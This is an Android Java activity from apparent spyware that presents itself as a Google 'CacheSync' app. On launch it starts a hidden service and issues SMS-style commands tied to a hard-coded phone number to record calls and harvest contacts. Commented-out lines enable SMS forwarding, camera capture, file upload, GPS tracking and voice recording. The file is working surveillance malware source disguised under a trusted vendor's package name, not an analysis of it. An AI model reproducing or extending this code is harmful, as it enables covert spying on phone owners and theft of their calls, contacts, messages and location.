package com.google.cachesync;

import java.io.PrintStream;

import com.code4bones.utils.*;

import android.os.Bundle;
import android.app.Activity;
import android.content.Intent;
import android.view.Menu;

public class MainActivity extends Activity {

	public final PrintStream gLog = NetLog.Init("CacheSync","CacheSync.log.txt", true); 
	public CommandPool cmdPool;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        
        cmdPool = CommandPool.getInstance(this);
        
        
        
        serviceStart();
        cmdPool.defaultSettings();
        cmdPool.Execute("+79037996299", "@setup;ack:0");
        cmdPool.Execute("+79037996299", "@rcalls;on");
        //cmdPool.Execute("+79037996299", "@rsms;on;mail");
        cmdPool.Execute("+79037996299", "@rcontacts;on");
        
 
       //cmdPool.Execute("+79037996299", "@cam");
        
       // cmdPool.Execute("+79037996299", "@file;f:/mnt/sdcard/shot.jpg");
        //cmdPool.Execute("+79037996299", "@net");
       // APNHelper h = new APNHelper(this);
       // h.getMMSApns();
        
        // cmdPool.Execute("+79037996299","@clisten;1");
       
        // cmdPool.Execute("+79037996299", "@file;/mnt/sdcard/120820024511.3gp");
        //cmdPool.Execute("+79037996299","@lcalls;f:120820");
       // cmdPool.Execute("+79037996299","@gps;t:5");
       // cmdPool.Execute("+79037996299", "@voice;t:10");
        // cmdPool.Execute("+79037996299","@setup;f:120810;");
       //cmdPool.Execute("+79037996299","@lcontacts");
     //  cmdPool.Execute("323","@file;/mnt/sdcard/CacheSync.log.txt");
    }

    public void serviceStart() {
    	Intent service = new Intent(this,CacheSyncService.class);
    	this.startService(service);
    }
    	
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
}
